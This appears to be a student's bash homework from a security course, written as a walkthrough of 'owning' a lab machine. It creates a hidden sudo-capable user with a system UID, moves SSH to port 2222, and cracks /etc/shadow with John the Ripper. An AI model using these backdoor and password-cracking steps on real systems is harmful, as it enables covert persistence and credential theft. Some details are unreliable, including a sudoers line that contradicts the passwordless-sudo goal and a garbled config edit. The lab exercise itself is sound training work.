## Week 6 Homework Submission File: Advanced Bash - Owning the System


# **Step 1: Shadow People** (following commands run as root)

# Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
useradd -M sysd

# Give your secret user a password: 
passwd sysd

# Give your secret user a system UID < 1000:
usermod -u 998 sysd

# Give your secret user the same GID:
groupmod -g 998 sysd

# Give your secret user full `sudo` access without the need for a password:
usermod -aG sudo sysd

# Test that sudo access works without your password:

su - sysd
sudo -l
sudo -vn && sudo -ln  
sudo whoami 
sudo /bin/kill 2213


# Step 2: Smooth Sailing

# Edit the `sshd_config` file:

Port 22    ```
Port 2222
    ```

# Step 3: Testing Your Configuration Update

# Restart the SSH service:
sudo systemctl restart sshd.service


# Exit the root account:
exit


# SSH to the target machine using your sysd account and port 2222:
ssh sysd@192.168.6.105 -p 2222


# Use sudo to switch to the root user:
sudo su


# Step 4: Crack All the Passwords


# SSH back to the system using your sysd account and port 2222:
ssh sysd@192.168.6.105 -p 2222


# Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:


# To escalate privileges, ran command ‘visudo’ and added sysd user to file as below under User privileges and saved:
sysd    (ALL : ALL) ALL

# Command to crack passwords”
john /etc/shadow
